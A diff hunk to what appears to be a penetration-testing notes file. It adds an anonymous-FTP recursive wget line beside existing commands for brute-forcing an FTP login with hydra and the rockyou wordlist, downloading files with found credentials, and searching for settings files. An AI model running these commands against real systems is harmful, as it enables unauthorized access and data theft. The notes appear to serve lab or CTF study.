@@ -65,6 +65,7 @@ hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
 ##### Downloading files recursively
 ````
 wget -r ftp://steph:billabong@10.1.1.68/
+wget -r ftp://anonymous:anonymous@192.168.204.157/
 ````
 ````
 find / -name Settings.*  2>/dev/null #looking through the files
